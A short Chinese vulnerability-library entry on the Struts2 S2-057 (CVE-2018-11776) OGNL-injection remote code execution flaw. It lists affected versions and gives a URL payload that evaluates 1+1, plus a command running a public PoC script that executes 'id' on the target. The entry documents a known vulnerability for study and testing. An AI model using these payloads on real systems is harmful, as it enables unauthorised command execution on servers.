---
title: 'Struts2 S2-057 远程代码执行漏洞(CVE-2018-11776)'
date: Mon, 05 Oct 2020 08:24:14 +0000
draft: false
tags: ['白阁-漏洞库']
---

#### 影响环境

Struts <= Struts 2.3.34, Struts 2.5.16

#### 利用

S2-057要求具备以下条件: action元素没有设置名称空间属性，或者使用了通配符 名称空间将由用户从uri传递并解析为OGNL表达式，最终导致远程代码执行漏洞。 Payload:

```
http://your-ip:8080/%24%7b%31%2b%31%7d/actionChain1.action 
```

![](Struts2%20S2-057%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2018-11776)/20200630143132425.png) 



可以看到算出了1+1=2的结果 参考POC ：https://github.com/Fnzer0/S2-057-poc
python 1.py -u http://192.168.111.129:8080/{{INJECTION_POINT}}/actionChain1.action -p S2-057-2 -c id --exp 

![](Struts2%20S2-057%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2018-11776)/2020063014315669.png) 

发现执行了id命令

